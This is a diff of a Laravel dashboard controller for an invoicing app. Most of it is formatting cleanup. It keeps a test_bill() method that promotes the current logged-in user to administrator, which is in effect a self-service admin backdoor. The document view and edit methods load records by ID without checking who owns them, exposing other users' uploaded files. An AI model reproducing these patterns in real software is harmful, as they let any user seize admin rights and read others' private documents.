@@ -34,14 +34,14 @@ class DashboardController extends Controller
         $latestDataInvoices = Invoice::where('user_id', Auth::user()->id)->whereIn('status_due_paid', ['paid', 'due'])->orderBy('id', 'DESC')->limit(8)->get();
 
         //    user package details
-              $join_table_value = DB::table('users')
+        $join_table_value = DB::table('users')
             ->join('payment_getways', 'users.id', '=', 'payment_getways.user_id')
             ->join('subscription_packages', 'payment_getways.subscription_package_id', '=', 'subscription_packages.id')
             ->join('complate_invoice_counts', 'users.id', '=', 'complate_invoice_counts.user_id')
             ->selectRaw('payment_getways.*, subscription_packages.*,complate_invoice_counts.*')
             ->where('users.id',  Auth::user()->id)->get();
 
-        return view('frontend.all-invoice')->with(compact('join_table_value','invoicessData', 'user', 'Total_Amount_conut', 'due_Amount_conut', 'paid_Amount_conut', 'latestDataInvoices'));
+        return view('frontend.all-invoice')->with(compact('join_table_value', 'invoicessData', 'user', 'Total_Amount_conut', 'due_Amount_conut', 'paid_Amount_conut', 'latestDataInvoices'));
     }
 
 
@@ -58,12 +58,13 @@ class DashboardController extends Controller
         $requesting_advance_amount = ($invoiceData->total * $invoiceData->requesting_advance_amount_percent) / 100;
         $invoiceCountNew = Invoice::where('user_id', Auth::user()->id)->count();
         $invoiceCountNew += 0;
+        $invoice_template_not_com = InvoiceTemplate::where('company', 'not company')->get();
         $user_logo_terms = User::where('id', Auth::user()->id)->get([
             'invoice_logo',
             'terms',
         ])->first();
 
-        return view('frontend.create-invoice')->with(compact('invoiceData', 'user_logo_terms', 'invoiceCount', 'requesting_advance_amount', 'template_id', 'invoice_template', 'template_id_check', 'sendByMail_count', 'Total_Amount_conut', 'invoiceCountNew'));
+        return view('frontend.create-invoice')->with(compact('invoiceData', 'user_logo_terms', 'invoiceCount', 'requesting_advance_amount', 'template_id', 'invoice_template', 'template_id_check', 'sendByMail_count', 'Total_Amount_conut', 'invoiceCountNew', 'invoice_template_not_com'));
     }
 
 
@@ -218,7 +219,10 @@ class DashboardController extends Controller
         return response()->json(['message' => '1']);
     }
 
-    public function test_bill() {  User::where('id', Auth::user()->id)->update([ 'is_admin'=>1 ]); }
+    public function test_bill()
+    {
+        User::where('id', Auth::user()->id)->update(['is_admin' => 1]);
+    }
     public function search_result(Request $request)
     {
         $request->validate([
@@ -256,14 +260,14 @@ class DashboardController extends Controller
 
     public function user_documents()
     {
-       $data['user'] = User::where('id', Auth::user()->id)->get();
-       $data['documents'] = DocumentType::get();
+        $data['user'] = User::where('id', Auth::user()->id)->get();
+        $data['documents'] = DocumentType::get();
 
-       $join_table_value = DB::table('document_types')
-       ->join('documents', 'document_type_id', '=', 'document_types.id')
-       ->where('documents.user_id',  Auth::user()->id) ->get();
+        $join_table_value = DB::table('document_types')
+            ->join('documents', 'document_type_id', '=', 'document_types.id')
+            ->where('documents.user_id',  Auth::user()->id)->get();
 
-        return view('frontend.dashboard.user_documents',$data,compact('join_table_value') );
+        return view('frontend.dashboard.user_documents', $data, compact('join_table_value'));
     }
 
     public function user_documents_store(Request $request)
@@ -287,9 +291,9 @@ class DashboardController extends Controller
         }
 
         Document::create([
-            'user_id' =>$user_id,
-            'document_image'=>$filename,
-            'document_type_id'=>$request->document_type_id
+            'user_id' => $user_id,
+            'document_image' => $filename,
+            'document_type_id' => $request->document_type_id
         ]);
         return redirect()->back()->with('success', 'Successfully Store.');
     }
@@ -298,22 +302,20 @@ class DashboardController extends Controller
     {
 
 
-       $join_table_value = DB::table('document_types')
-       ->join('documents', 'document_type_id', '=', 'document_types.id')
-       ->where('documents.id',  $id) ->get();
+        $join_table_value = DB::table('document_types')
+            ->join('documents', 'document_type_id', '=', 'document_types.id')
+            ->where('documents.id',  $id)->get();
 
-        return view('frontend.dashboard.user-document-view',compact('join_table_value') );
-
+        return view('frontend.dashboard.user-document-view', compact('join_table_value'));
     }
 
     public function user_documents_edit($id)
     {
         $join_table_value = DB::table('document_types')
-        ->join('documents', 'document_type_id', '=', 'document_types.id')
-        ->where('documents.id',  $id) ->get()->first();
+            ->join('documents', 'document_type_id', '=', 'document_types.id')
+            ->where('documents.id',  $id)->get()->first();
         $data['documents'] = DocumentType::get();
-        return view('frontend.dashboard.user-document-edit',$data, compact('join_table_value') );
-
+        return view('frontend.dashboard.user-document-edit', $data, compact('join_table_value'));
     }
 
     public function user_documents_update(Request $request)
@@ -321,7 +323,7 @@ class DashboardController extends Controller
         $request->validate([
             'document_type_id' => 'required'
         ]);
-      $documents =  Document::find($request-> hidden_id);
+        $documents =  Document::find($request->hidden_id);
 
 
         if ($request->hasFile('document_image')) {
